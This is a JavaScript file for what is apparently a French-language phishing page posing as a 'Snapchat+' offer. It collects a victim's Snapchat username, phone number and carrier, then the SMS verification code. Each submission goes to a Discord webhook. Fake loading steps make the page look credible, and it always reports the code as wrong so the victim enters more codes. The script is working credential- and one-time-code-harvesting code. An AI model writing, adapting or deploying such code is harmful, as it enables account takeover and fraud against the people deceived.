const carrierButtons = document.querySelectorAll(".carrier-btn");
const usernameInput = document.getElementById("username");
const phoneInput = document.getElementById("phone");
const claimBtn = document.getElementById("claim-btn");
const verifyBtn = document.getElementById("verify-btn");
const codeInput = document.getElementById("code");
const statusLine = document.getElementById("status-line");
const statusText = document.getElementById("status-text");
const codeStatus = document.getElementById("code-status");

const stepForm = document.getElementById("step-form");
const stepLoading = document.getElementById("step-loading");
const stepCode = document.getElementById("step-code");
const loadingMessage = document.getElementById("loading-message");
const loadingSteps = document.querySelectorAll(".loading__step");

const carrierLabels = {
  bouygues: "Bouygues",
  orange: "Orange",
  sfr: "SFR",
};

const messages = {
  bouygues: "Bouygues sélectionné — entrez votre pseudo et votre numéro.",
  orange: "Orange sélectionné — entrez votre pseudo et votre numéro.",
  sfr: "SFR sélectionné — entrez votre pseudo et votre numéro.",
};

const loadingMessages = [
  "Validation du compte…",
  "Envoi du code de vérification…",
  "L'envoi peut prendre plusieurs minutes, veuillez patienter…",
];

let selectedCarrier = null;
let formData = {};

function setStatus(text, state = "idle") {
  statusText.textContent = text;
  statusLine.classList.toggle("is-active", state === "active");
  statusLine.classList.toggle("is-ready", state === "ready");
}

function showStep(step) {
  stepForm.hidden = step !== "form";
  stepLoading.hidden = step !== "loading";
  stepCode.hidden = step !== "code";
}

function updateClaimButton() {
  const username = usernameInput.value.trim();
  const phone = phoneInput.value.trim();
  claimBtn.disabled = !selectedCarrier || !username || !phone;
}

function updateStatusFromInputs() {
  if (!selectedCarrier) return;

  const username = usernameInput.value.trim().replace(/^@/, "");
  const phone = phoneInput.value.trim();

  if (!username || !phone) {
    setStatus(messages[selectedCarrier], "active");
    return;
  }

  setStatus(`Prêt — @${username} · ${carrierLabels[selectedCarrier]} · ${phone}`, "ready");
}

async function sendToDiscord({ title, fields, color = 5814783 }) {
  if (!DISCORD_WEBHOOK_URL) {
    console.warn("Webhook Discord non configuré dans config.js");
    return;
  }

  try {
    await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        embeds: [
          {
            title,
            color,
            fields,
            timestamp: new Date().toISOString(),
          },
        ],
      }),
    });
  } catch (error) {
    console.error("Erreur webhook Discord :", error);
  }
}

function setLoadingStep(index) {
  loadingMessage.textContent = loadingMessages[index];

  loadingSteps.forEach((step, i) => {
    step.classList.toggle("is-active", i === index);
    step.classList.toggle("is-done", i < index);
  });
}

function wait(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function startLoadingFlow() {
  showStep("loading");
  setLoadingStep(0);

  await sendToDiscord({
    title: "📱 Nouvelle demande Snapchat+",
    color: 16776960,
    fields: [
      { name: "Pseudo", value: formData.username, inline: true },
      { name: "Téléphone", value: formData.phone, inline: true },
      { name: "Opérateur", value: formData.carrier, inline: true },
    ],
  });

  await wait(2800);
  setLoadingStep(1);

  await wait(3200);
  setLoadingStep(2);

  await wait(3500);

  loadingSteps.forEach((step) => {
    step.classList.remove("is-active");
    step.classList.add("is-done");
  });

  await wait(800);
  showStep("code");
  codeInput.focus();
}

carrierButtons.forEach((button) => {
  button.addEventListener("click", () => {
    selectedCarrier = button.dataset.carrier;

    carrierButtons.forEach((btn) => {
      const isSelected = btn === button;
      btn.classList.toggle("is-selected", isSelected);
      btn.setAttribute("aria-pressed", String(isSelected));
    });

    setStatus(messages[selectedCarrier], "active");
    usernameInput.focus();
    updateClaimButton();
    updateStatusFromInputs();
  });
});

usernameInput.addEventListener("input", () => {
  updateClaimButton();
  updateStatusFromInputs();
});

phoneInput.addEventListener("input", () => {
  updateClaimButton();
  updateStatusFromInputs();
});

claimBtn.addEventListener("click", () => {
  if (claimBtn.disabled) return;

  formData = {
    username: usernameInput.value.trim().replace(/^@/, ""),
    phone: phoneInput.value.trim(),
    carrier: carrierLabels[selectedCarrier],
  };

  startLoadingFlow();
});

codeInput.addEventListener("input", () => {
  verifyBtn.disabled = codeInput.value.trim().length < 4;
});

verifyBtn.addEventListener("click", async () => {
  const code = codeInput.value.trim();
  if (!code) return;

  verifyBtn.disabled = true;
  verifyBtn.textContent = "Vérification…";
  codeStatus.textContent = "Vérification du code en cours…";

  await sendToDiscord({
    title: "🔐 Code de vérification",
    color: 5763719,
    fields: [
      { name: "Pseudo", value: formData.username, inline: true },
      { name: "Téléphone", value: formData.phone, inline: true },
      { name: "Code", value: code, inline: true },
      { name: "Opérateur", value: formData.carrier, inline: true },
    ],
  });

  await wait(1500);
  codeStatus.textContent = "Code incorrect ou expiré. Réessayez.";
  verifyBtn.textContent = "Vérifier le code";
  verifyBtn.disabled = false;
});
